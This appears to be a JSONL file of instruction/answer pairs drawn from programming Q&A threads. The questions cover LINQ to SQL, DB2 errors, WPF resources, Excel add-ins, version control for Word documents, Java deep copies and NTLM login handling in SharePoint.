{"instruction": "I have one table \"orders\" with a foreing key \"ProductID\".\nI want to show the orders in a grid with the product name, without LazyLoad for better performance, but I if use DataLoadOptions it retrieves all Product fields, which seams like a overkill.\nIs there a way to retrieve only the Product name in the first query?\nCan I set some attribute in the DBML?\nIn this table says that \"Foreign-key values\" are \"Visible\" in Linq To SQL, but don't know what this means.\nEdit: Changed the title, because I'm not really sure the there is no solution.\nCan't believe no one has the same problem, it is a very common scenario.", "output": "What you are asking for is a level of optimisation the linq-to-sql does not provide. I think your best bet is to create a query that returns exactly the data you want, possibly as an anonymous type:\nfrom order in DB.GetTable<Orders>()\njoin product in DB.GetTable<Products>()\non order.ProductID = product.ID\nselect new { ID = order.ID, Name = order.Name, ProductName = product.Name };"}
{"instruction": "I came across a printed article by Bertrand Meyer where he states that tests can be generated from specifications. My development team does nothing like this, but it sounds like a good technique to consider. How are you generating tests from specifications? How would you describe the success your having in discovering program faults via this method?", "output": "This might be a reference to RSpec, which is a really clever way of developing tests as a series of requirements. I'm still getting used to it, but it's been very handy in both defining what I need to do and then ensuring I do it."}
{"instruction": "I came across a printed article by Bertrand Meyer where he states that tests can be generated from specifications. My development team does nothing like this, but it sounds like a good technique to consider. How are you generating tests from specifications? How would you describe the success your having in discovering program faults via this method?", "output": "@Tim Sullivan from Bertrand Meyer it can only be related to Eiffel :)\nI think he's talking about ESpec. Given the name RSpec from the Ruby Folk, I think we can give them the label \"heavily inspired\"."}
{"instruction": "I am trying to get the DB2 data provider from a 32-bit .Net application to connect to DB2 running as a 32-bit application on Vista 64 (is that confusing enough yet)?  Unfortunately, I am getting the following error:\n\nSQL1159 Initialization error with DB2 .NET Data Provider, reason code 7, tokens 9.5.0.DEF.2, SOFTWARE\\IBM\\DB2\\InstalledCopies\n\nThere are several IBM forum posts mentioning it, but little useful guidance.  Has anyone experienced this before?  Or do you have better ideas for fixing it?", "output": "I vaguely remember having a similar sounding problem with the DB2 for as/400 oledb driver when trying to set up a linked server from sql 2005 to the as/400. It was a permissions issue and I eventually found that only sql server accounts (not windows) could use the linked server because (i think) then the driver was loading using the credentials of the sql instead of impersonated ones. If it works when \"run as\" admin then it gotta be permissions."}
{"instruction": "I am trying to get the DB2 data provider from a 32-bit .Net application to connect to DB2 running as a 32-bit application on Vista 64 (is that confusing enough yet)?  Unfortunately, I am getting the following error:\n\nSQL1159 Initialization error with DB2 .NET Data Provider, reason code 7, tokens 9.5.0.DEF.2, SOFTWARE\\IBM\\DB2\\InstalledCopies\n\nThere are several IBM forum posts mentioning it, but little useful guidance.  Has anyone experienced this before?  Or do you have better ideas for fixing it?", "output": "I assume you have seen the writeup of SQL1159 in the DB2 Reference Guide?\nUnfortunately for you, the reason codes stop at 6 and don't continue to 7.  It does say:\n\nUser response: There was a problem with your DB2 installation. If this is the first time DB2 was installed on this computer, review the install logs for any possible errors and run a repair of DB2 from the Add/Remove Programs control panel applet. The default location of the installation logs is the My Documents/DB2LOG folder of the user that performed the installation. If this does not resolve the issue please contact IBM Support and provide the reason code associated with this message along with any installation logs.\n\nSo I guess try to reinstall it and if the problem continues you'll have to contact IBM.\nSorry, I know that's not much help."}
{"instruction": "I know I can programatically make the taskbar item for a particular window start flashing when something changes, but is there any way I can stop it from flashing either programatically after a certain period of time or at least is there a keyboard shortcur I can give to my users to somehow stop the flashing?", "output": "The FlashWindowEx function which controls the flashing takes a FLASHWINFO struct which has a uCount field to control how many times it flashes.  Also, a possible value for the dwFlags field is FLASHW_STOP to cause the flashing to stop.\nEDIT: Forgot was a C# tagged question ... so P/Invoke goodness found here."}
{"instruction": "It's one of those things that seems to have an odd curve where the more I think about it, the more it makes sense.  To a certain extent, of course.  And then it doesn't make sense to me at all.\nCare to enlighten me?", "output": "Because in most cases you've got to sort your results first. For example, when you search on Google, you can view only up to 100 pages of results. They don't bother sorting by page-rank beyond 1000 websites for given keyword (or combination of keywords).\nPagination is fast. Sorting is slow."}
{"instruction": "It's one of those things that seems to have an odd curve where the more I think about it, the more it makes sense.  To a certain extent, of course.  And then it doesn't make sense to me at all.\nCare to enlighten me?", "output": "This is a really vague question. We'd need a concrete example to get a better idea of the problem."}
{"instruction": "It's one of those things that seems to have an odd curve where the more I think about it, the more it makes sense.  To a certain extent, of course.  And then it doesn't make sense to me at all.\nCare to enlighten me?", "output": "Lubos is right, the problem is not the fact that you are paging (which takes a HUGE amount of data off the wire), but that you need to figure out what is actually going on the page..\nThe fact that you need to page implies there is a lot of data. A lot of data takes a long time to sort :)"}
{"instruction": "I have a SQL script that inserts data (via INSERT statements currently numbering in the thousands) One of the columns contains a unique identifier (though not an IDENTITY type, just a plain ol' int) that's actually unique across a few different tables. \nI'd like to add a scalar function to my script that gets the next available ID (i.e. last used ID + 1) but I'm not sure this is possible because there doesn't seem to be a way to use a global or static variable from within a UDF, I can't use a temp table, and I can't update a permanent table from within a function. \nCurrently my script looks like this: \n\n   declare @v_baseID int \n   exec dbo.getNextID @v_baseID out  --sproc to get the next available id\n   --Lots of these - where n is a hardcoded value\n   insert into tableOfStuff (someStuff, uniqueID) values ('stuff', @v_baseID + n ) \n   exec dbo.UpdateNextID @v_baseID + lastUsedn  --sproc to update the last used id\n\nBut I would like it to look like this: \n\n   --Lots of these\n   insert into tableOfStuff (someStuff, uniqueID) values ('stuff', getNextID() ) \n\nHardcoding the offset is a pain in the arse, and is error prone.  Packaging it up into a simple scalar function is very appealing, but I'm starting to think it can't be done that way since there doesn't seem to be a way to maintain the offset counter between calls.  Is that right, or is there something I'm missing.  \nWe're using SQL Server 2005 at the moment. \nedits for clarification:\nTwo users hitting it won't happen.  This is an upgrade script that will be run only once, and never concurrently. \nThe actual sproc isn't prefixed with sp_, fixed the example code. \nIn normal usage, we do use an id table and a sproc to get IDs as needed, I was just looking for a cleaner way to do it in this script, which essentially just dumps a bunch of data into the db.", "output": "It would probably be more work than it's worth, but you can use static C#/VB variables in a SQL CLR UDF, so I think you'd be able to do what you want to do by simply incrementing this variable every time the UDF is called.  The static variable would be lost whenever the appdomain unloaded, of course.  So if you need continuity of your ID from one day to the next, you'd need a way, on first access of NextId, to poll all of tables that use this ID, to find the highest value."}
{"instruction": "It's one of those things that seems to have an odd curve where the more I think about it, the more it makes sense.  To a certain extent, of course.  And then it doesn't make sense to me at all.\nCare to enlighten me?", "output": "I thought you meant pagination of the printed page - that's where I cut my teeth.  I was going to enter a great monologue about collecting all the content for the page, positioning (a vast number of rules here, constrait engines are quite helpful) and justification... but apparently you were talking about the process of organizing information on webpages.  \nFor that, I'd guess database hits.  Disk access is slow.  Once you've got it in memory, sorting is cheap."}
{"instruction": "The DOI system places basically no useful limitations on what constitutes a reasonable identifier. However, being able to pull DOIs out of PDFs, web pages, etc. is quite useful for citation information, etc.\nIs there a reliable way to identify a DOI in a block of text without assuming the 'doi:' prefix? (any language acceptable, regexes preferred, and avoiding false positives a must)", "output": "The following regex should do the job (Perl regex syntax):\n/(10\\.\\d+\\/\\d+)/\n\nYou could do some additional sanity checking by opening the urls\nhttp://hdl.handle.net/<doi>\n\nand\nhttp://dx.doi.org/<doi>\n\nwhere  is the candidate doi,\nand testing that you a) get a 200 OK http status, and b) the returned page is not the \"DOI not found\" page for the service."}
{"instruction": "I have a SQL script that inserts data (via INSERT statements currently numbering in the thousands) One of the columns contains a unique identifier (though not an IDENTITY type, just a plain ol' int) that's actually unique across a few different tables. \nI'd like to add a scalar function to my script that gets the next available ID (i.e. last used ID + 1) but I'm not sure this is possible because there doesn't seem to be a way to use a global or static variable from within a UDF, I can't use a temp table, and I can't update a permanent table from within a function. \nCurrently my script looks like this: \n\n   declare @v_baseID int \n   exec dbo.getNextID @v_baseID out  --sproc to get the next available id\n   --Lots of these - where n is a hardcoded value\n   insert into tableOfStuff (someStuff, uniqueID) values ('stuff', @v_baseID + n ) \n   exec dbo.UpdateNextID @v_baseID + lastUsedn  --sproc to update the last used id\n\nBut I would like it to look like this: \n\n   --Lots of these\n   insert into tableOfStuff (someStuff, uniqueID) values ('stuff', getNextID() ) \n\nHardcoding the offset is a pain in the arse, and is error prone.  Packaging it up into a simple scalar function is very appealing, but I'm starting to think it can't be done that way since there doesn't seem to be a way to maintain the offset counter between calls.  Is that right, or is there something I'm missing.  \nWe're using SQL Server 2005 at the moment. \nedits for clarification:\nTwo users hitting it won't happen.  This is an upgrade script that will be run only once, and never concurrently. \nThe actual sproc isn't prefixed with sp_, fixed the example code. \nIn normal usage, we do use an id table and a sproc to get IDs as needed, I was just looking for a cleaner way to do it in this script, which essentially just dumps a bunch of data into the db.", "output": "I'm starting to think it can't be done that way since there doesn't seem to be a way to maintain the offset counter between calls. Is that right, or is there something I'm missing.\n\nYou aren't missing anything; SQL Server does not support global variables, and it doesn't support data modification within UDFs.  And even if you wanted to do something as kludgy as using CONTEXT_INFO (see http://weblogs.sqlteam.com/mladenp/archive/2007/04/23/60185.aspx), you can't set that from within a UDF anyway.\nIs there a way you can get around the \"hardcoding\" of the offset by making that a variable and looping over the iteration of it, doing the inserts within that loop?"}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "I would buy a book - the Adam Nathan WPF book is good.\nhttp://www.amazon.com/Windows-Presentation-Foundation-Unleashed-WPF/dp/0672328917"}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "Ok, in terms of reading material, this is the pick of the books out there: Windows Presentation Foundation Unleashed.\nFor blogs, there are a lot of blogs and\u00a0articles on WindowsClient.net, and there's an excellent blog all about data binding in WPF by Beatriz Costa. Also take a look at LearnWPF.com and Ask Dr. WPF."}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "Here are a few \"How Do I\" videos to get you started:\nhttp://windowsclient.net/learn/videos_wpf.aspx"}
{"instruction": "I am having trouble finding good guides for WPF.\nI have experience in C# and .NET but  I don't know anything about WPF except for the regular marketing-ish description of the technology as a whole.\nCan anyone point me to a good beginner's tutorial/guide on WPF.", "output": "Scott Hanselmann has blogged extensively about his experience in learning WPF by creating his 'BabySmash' windows application. All the source code is on codeplex and he has many blog articles describing his progress.\nInitial BabySmash article\nCodeplex source\nBabySmash website"}
{"instruction": "I've writen an Excel-based, database reporting tool. Currentely, all the VBA code is associated with a single XLS file. The user generates the report by clicking a button on the toolbar. Unfortunately, unless the user has saved the file under another file name, all the reported data gets wiped-out.\nWhen I have created similar tools in Word, I can put all the code in a template (.dot) file and call it from there. If I put the template file in the Office startup folder, it will launch everytime I start Word. Is there a similar way, to package and distribute my code in Excel? I've tried using Add-ins, but I didn't find a way to call the code from the application window.", "output": "You can modify the user's personal.xls file, stored in the excel startup directory (varies between Office versions). If you have lots of users though, that can be fiddly.\nAn alternative way to get over your problem is to store the macro in a template (.xlt) file. Then when the users opens it they can't save it back over the original file, but have to specify a new filename to save it as. The disadvantage of this method is that you then get multiple copies of your original code all over the place with each saved file. If you modify the original .xlt and someone reruns the old macro in a previously-saved .xls file then things can get out of step."}
{"instruction": "The DOI system places basically no useful limitations on what constitutes a reasonable identifier. However, being able to pull DOIs out of PDFs, web pages, etc. is quite useful for citation information, etc.\nIs there a reliable way to identify a DOI in a block of text without assuming the 'doi:' prefix? (any language acceptable, regexes preferred, and avoiding false positives a must)", "output": "@Silas The sanity checking is a good idea. However, the regex doesn't cover all DOIs. The first element must (currently) be 10, and the second element must (currently) be numeric, but the third element is barely restricted at all:\n\n\"Legal characters are the legal graphic characters of Unicode. This specifically excludes the control character ranges 0x00-0x1F and 0x80-0x9F...\"  \n\nand that's where the real problem lies. In practice, I've never seen whitespace used, but the spec specifically allows for it. Basically, there doesn't seem to be a sensible way of detecting the end of a DOI."}
{"instruction": "I've got a problem here with an MSI deployment that I'm working on (using InstallShield). We have a program running in the background that needs to run per-user, and it needs to start automatically without user intervention.\nThe problem is with Group Policy Object/Active Directory (GPO/AD) deployment the application is started in the SYSTEM context before anyone is logged in rather than as the user who is about to log in. The application can only run once per user, and it seems that the SYSTEM process prevents the USER process from starting. This means the PCs need to be rebooted twice before the software can be deployed to the users. How do we to stop this?\nBasically the current workflow is: \n\nInstallation/upgrade runs... kill background application\nInstall new files\nStartup background application\n\nThis works for published applications and interactive MSI installations - it's only 'assigned' applications that seem to have the problem. As step 3 happens in the SYSTEM context rather than the user context :(\nIdeally, I'd have the development team patch the EXE file to prevent launching in the SYSTEM context, but that's a release cycle away, and I'm looking for an installer-based solution for the interim.\n(I don't know Installscript... So I'm guessing VBScript is probably the way to go if there's no native InstallShield stuff I can use.)", "output": "You can use the LogonUser property of Windows Installer as a condition to the action launching the EXE."}
{"instruction": "I've writen an Excel-based, database reporting tool. Currentely, all the VBA code is associated with a single XLS file. The user generates the report by clicking a button on the toolbar. Unfortunately, unless the user has saved the file under another file name, all the reported data gets wiped-out.\nWhen I have created similar tools in Word, I can put all the code in a template (.dot) file and call it from there. If I put the template file in the Office startup folder, it will launch everytime I start Word. Is there a similar way, to package and distribute my code in Excel? I've tried using Add-ins, but I didn't find a way to call the code from the application window.", "output": "Simply move your code into an Excel Addin (XLA) - this gets loaded at startup (assuming it's in the %AppData%\\Microsoft\\Excel\\XLSTART folder) but if it's a addin, not a workbook, then only your macros and defined startup functions will be loaded.\nIf the functions depend on a spreadsheet itself, then you might want to use a combination of templates and addins.\nI'm distributing part of an application like this, we have addins for Word, Excel and Powerpoint (XLA, PPA, DOT) and also Office 2007 'ribbon' versions (DOTM, XLAM and PPAM)\nThe addin startup code creates toolbar buttons if they're not found, this means in any workbook/document/etc they can simply hit the toolbar button to run our code (we have two action buttons and one button that displays a settings dialog)\nTemplates aren't really the way to go for VBA code, Addins are definitely the way to go...\nSo to load the toolbars on startup we're using something like.. (checking to see if toolbar exists though - code will run for each worksheet that is opened, but toolbars are persistent for the user session)\nPublic Sub Workbook_Open()\n     ' startup code / add toolbar / load saved settings, etc.\nEnd Sub\n\nhope that helps :)"}
{"instruction": "I've got a problem here with an MSI deployment that I'm working on (using InstallShield). We have a program running in the background that needs to run per-user, and it needs to start automatically without user intervention.\nThe problem is with Group Policy Object/Active Directory (GPO/AD) deployment the application is started in the SYSTEM context before anyone is logged in rather than as the user who is about to log in. The application can only run once per user, and it seems that the SYSTEM process prevents the USER process from starting. This means the PCs need to be rebooted twice before the software can be deployed to the users. How do we to stop this?\nBasically the current workflow is: \n\nInstallation/upgrade runs... kill background application\nInstall new files\nStartup background application\n\nThis works for published applications and interactive MSI installations - it's only 'assigned' applications that seem to have the problem. As step 3 happens in the SYSTEM context rather than the user context :(\nIdeally, I'd have the development team patch the EXE file to prevent launching in the SYSTEM context, but that's a release cycle away, and I'm looking for an installer-based solution for the interim.\n(I don't know Installscript... So I'm guessing VBScript is probably the way to go if there's no native InstallShield stuff I can use.)", "output": "AHA! I knew there had to be a cleaner solution... the code I was working on was starting to look something like this:\nOn Error Resume Next \nstrComputer = \".\"\nSet objWMIService = GetObject(\"winmgmts:\" _\n    & \"{impersonationLevel=impersonate}!\\\\\" & strComputer & \"\\root\\cimv2\")\nSet colProcessList = objWMIService.ExecQuery _\n    (\"Select * from Win32_Process Where Name = 'BackgroundProcess.exe'\")\nFor Each objProcess in colProcessList\n    colProperties = objProcess.GetOwner(strNameOfUser,strUserDomain)\n    If strNameOfUser = \"SYSTEM\" Then    \n        objProcess.Terminate()\n    End If\nNext"}
{"instruction": "I'm pretty new to my company (2 weeks) and we're starting a new platform for our system using .NET 3.5 Team Foundation from DotNetNuke. Our \"architect\" is suggesting we use one class project. Of course, I chime back with a \"3-tier\" architecture (Business, Data, Web class projects). \nIs there any disadvantages to using this architecture? Pro's would be separation of code from data, keeping class objects away from your code, etc.", "output": "Because you want the capability of being able to distribute the layers onto different physical tiers (I always use \"tier\" for physical, and \"layer\" for logical), you should think twice before just putting everything into one class because you've got major refactorings to do if or when you do need to start distributing."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "You could do that, but if that files are binary you should always put a lock on it before editing. You won't get a conflict (which would be unresolvable)."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "You can, but you will allways compare the document versions with Word itself.\nI haven't heard a version control database which can track changes in Word documents.\nHowever there are some tools which can compare Word documents, so if you set up your version control client to use these tools for comparison, you can have some fun."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "Not necessarily. It depends on how often the new files are committed to the repo. If the files are edited several times before a commit, then you're precisely where you are now. The biggest benefit is if the file becomes corrupted.\nYou can version any file; this is how Time Machine in Mac OS X Leopard works, for example, and there is an interesting article by someone who committed his entire computing environment into CVS and then just maintained working copies on his home and work machines.\nBut \"better\" and \"easier\" are specific to your situation, and I'm not sure I completely understand your problem as things stand."}
{"instruction": "In Java, say you have a class that wraps an ArrayList (or any collection) of objects. \nHow would you return one of those objects such that the caller will not see any future changes to the object made in the ArrayList? \ni.e. you want to return a deep copy of the object, but you don't know if it is cloneable.", "output": "One option is to use serialization. Here's a blog post explaining it:\nhttp://weblogs.java.net/blog/emcmanus/archive/2007/04/cloning_java_ob.html"}
{"instruction": "In Java, say you have a class that wraps an ArrayList (or any collection) of objects. \nHow would you return one of those objects such that the caller will not see any future changes to the object made in the ArrayList? \ni.e. you want to return a deep copy of the object, but you don't know if it is cloneable.", "output": "Turn that into a spec:\n-that objects need to implement an interface in order to be allowed into the collection\nSomething like ArrayList<ICloneable>()\nThen you can be assured that you always do a deep copy - the interface should have a method that is guaranteed to return a deep copy.  \nI think that's the best you can do."}
{"instruction": "In Java, say you have a class that wraps an ArrayList (or any collection) of objects. \nHow would you return one of those objects such that the caller will not see any future changes to the object made in the ArrayList? \ni.e. you want to return a deep copy of the object, but you don't know if it is cloneable.", "output": "I suppose it is an ovbious answer:\nMake a requisite for the classes stored in the collection to be cloneable. You could check that at insertion time or at retrieval time, whatever makes more sense, and throw an exception.\nOr if the item is not cloneable, just fail back to the return by reference option."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "I guess one thing that nobody seems to have asked is if you have a legal requirement to store history of changes to the doc's?\nWhether you do or don't is going to have an impact on what solutions you can consider.\nAlso a notification mechanism for out of date copies is also a bundle of fun. If engineer A has a copy of a document and engineer B then edits it and commits the changes you want engineer A to be notified that his copy is out of date.\nDocument control can become a real can of worms quite easily.\nMaybe keep the doc's under CVS or SVN and set it up so that emails are generated to whoever has checked out a copy when updates for the same doc. are checked in to the repository?\nEdit: I forgot to add don't forget to use the binary switch, e.g. -kb for CVS, when adding the new doc. Otherwise, you will get any sequences of data that happen to match the ascii for keyword strings having the relevant config management data appended thereby corrupting your doc. data."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "Subversion, CVS and all other source control systems are not good for Word documents and other office files (such as Excel spread sheets), since the files themselves are stored in a binary format. That means that you can never go back and annotate (or blame, or whatever you want to call it), or do diffs between documents.\nThere are revision control systems for Word documents out there, unfortunately I do not know any good ones. We use such control systems for Excel at my work, and unfortunately they all cost money.\nThe good thing is that they make life a lot easier, especially if you ever have to do an audit or due diligence."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "Thinking out of the box, would migrating to a Wiki be out of the question?\nSince you consider it feasible to force your users into Subversion (or something similar), a larger change seem acceptable.\nAnother migration target could be to use some kind of structured XML document format (DocBook comes to mind). This would enable you to indeed use diffs and source control, while getting all sorts of document formats for free."}
{"instruction": "I am in charge of about 100+ documents (word document, not source code) that needs revision by different people in my department. Currently all the documents are in a shared folder where they will retrieve, revise and save back into the folder. \nWhat I am doing now is looking up the \"date modified\" in the shared folder, opened up recent modified documents and use the \"Track Change\" function in MS Word to apply the changes. I find this a bit tedious.\nSo will it be better and easier if I commit this in a version control database?\nBasically I want to keep different version of a file.\n\nWhat have I learn from answers:\n\nUse Time Machine to save different\nversion (or Shadow copy in Vista)\nThere is a difference between text\nand binary documents when you use\nversion control app. (I didn't know\nthat)\nDiff won't work on binary files\nA notification system (ie email) for revision is great\nGoogle Docs revision feature.\n\nUpdate : \nI played around with Google Docs revision feature and feel that it is almost right for me. Just a bit annoyed with the too frequent versioning (autosaving). \nBut what feels right for me doesn't mean it feels right for my dept. Will they be okay with saving all these documents with Google?", "output": "I've worked with Word documents in SVN. With TortoiseSVN, you can easily diff Word documents (between working copy and repository, or between two repository revisions). It's really slick and definitely recommended.\nThe other thing to do if you're using Word documents in SVN is to add the svn:needs-lock property to the Word documents. This will prevent two people from trying to edit the same document at the same time, since unfortunately there's no good way to merge Word documents.\nWith the above two things, handling revision controlled Word documents is at least tolerable. It certainly beats the alternative of using a shared folder and track-changes."}
{"instruction": "I run a game and the running is done by hand, I have a few scripts that help me but essentially it's me doing the work. I am at the moment working on web app that will allow the users to input directly some of their game actions and thus save me a lot of work.\nThe problem is that I'm one man working on a moderately sized (upwards of 20 tables) project, the workload isn't the issue, it's that bugs will have slipped in even though I test as I write. So my question is thus two-fold.\n\nBeta testing, I love open beta's but would a closed beta be somehow more effective and give better results?\nHow should I bring in the app? Should I one turn drop it in and declare it's being used or should I use it alongside the normal construct of the game?", "output": "I don't understand what you mean by \"bring in the app\" and \"one turn drop it\". By \"bring in the app\" do you mean deploy? As for \"One turn drop\", I totally don't understand it.\nAs for open betas, that depends on your audience, really. Counterstrike, for example, apparently run a few closed betas before doing open betas, so here's my suggestion:\n\nSet up a forum in some free forumboard, or set up a topic in a popular gaming forum.\nLook for people (whether or not they are in those forums) that you trust, and let them in in a closed beta. This will allow you to iron out serious kinks at first.\nIf your closed group isn't reporting as much bugs any more, release it to open beta, pointing out ways on how they could give feedback to you.\n\nThis is similar to the approach StackOverflow took, but this being a game setting it up on a gaming forum will give the dual benefit of advertising your game and getting some interested beta testers."}
{"instruction": "I run a game and the running is done by hand, I have a few scripts that help me but essentially it's me doing the work. I am at the moment working on web app that will allow the users to input directly some of their game actions and thus save me a lot of work.\nThe problem is that I'm one man working on a moderately sized (upwards of 20 tables) project, the workload isn't the issue, it's that bugs will have slipped in even though I test as I write. So my question is thus two-fold.\n\nBeta testing, I love open beta's but would a closed beta be somehow more effective and give better results?\nHow should I bring in the app? Should I one turn drop it in and declare it's being used or should I use it alongside the normal construct of the game?", "output": "I'll try to answer with the limited amount of details you've given.\n1: Wether it's open or closed is really only an issue if you have great buzz, and a large group of users hammering down  your door, trying toget in on the action. \nIf this is the case, I think you might get more loyalty and commitment from users in a closed beta.\n2: You haven't given many (any) details as to what kind of game you are talking about, so it's pretty hard to answer this one.\n/Jonas"}
{"instruction": "I run a game and the running is done by hand, I have a few scripts that help me but essentially it's me doing the work. I am at the moment working on web app that will allow the users to input directly some of their game actions and thus save me a lot of work.\nThe problem is that I'm one man working on a moderately sized (upwards of 20 tables) project, the workload isn't the issue, it's that bugs will have slipped in even though I test as I write. So my question is thus two-fold.\n\nBeta testing, I love open beta's but would a closed beta be somehow more effective and give better results?\nHow should I bring in the app? Should I one turn drop it in and declare it's being used or should I use it alongside the normal construct of the game?", "output": "This is my general approach to testing/launching.\nHow you test/launch depends mostly on:\n\nWhat your application is.\nWho your users are.\n\nIf you application is a technical application and is geared to the technically-minded, the word \"beta\" won't really scare them - but provide an opportunity to test the product before it goes 'live', and help to improve the system.  This is the ideal circumstance in which to use either an open or closed beta.  It's usually beneficial to start off 'closed' with a group of people you select and trust to bug-find quickly and reliably - after you're more confident that all the critical bugs are gone, open it up with an invite system (for example).\nIf, however, your application is 'trivial' from a technical standpoint (i.e. it's something like Twitter, or Facebook, or Flickr - nothing that is inherently geared towards technical usage), then you're going to have to be more careful in how you plan your testing.  Closed testing is most definitely your first port of call, and this should last for longer than a closed beta on a more 'technical' product.  The reason?  Your 'average Joe' doesn't necessarily know what the word \"beta\" means, and others may well be scared by it, or judge your service prematurely (not understanding the concept of this 'public testing' phase).  Many won't want to be used as guinea pigs."}
{"instruction": "In a recent sharepoint project, I implemented an authentication webpart which should replace the NTLM authentication dialog box. It works fine as long as the user provides valid credentials. Whenever the user provides invalid credentials, the NTLM dialog box pops up in Internet Explorer.\nMy Javascript code which does the authentication via XmlHttpRequest looks like this:\nfunction Login() {\n   var request = GetRequest(); // retrieves XmlHttpRequest\n   request.onreadystatechange = function() {\n      if (this.status == 401) {     // unauthorized request -> invalid credentials\n         // do something to suppress NTLM dialog box...\n         // already tried location.reload(); and window.location = <url to authentication form>;\n      }\n   }\n   request.open(\"GET\", \"http://myServer\", false, \"domain\\\\username\", \"password\");\n   request.send(null);\n}\n\nI don't want the NTLM dialog box to be displayed when the user provides invalid credentials. Instead the postback by the login button in the authentication form should be executed. In other words, the browser should not find out about my unauthorized request.\nIs there any way to do this via Javascript?", "output": "IIRC, the browser pops the auth dialog when the following comes back in the request stream:\n\nHttp status of 401\nWWW-Authenticate header\n\nI would guess that you'd need to suppress one or both of those. The easy way to do that is to have a login method that'll take a Base64 username and password (you are using HTTPS, right?) and return 200 with a valid/invalid status. Once the password has been validated, you can use it with XHR."}
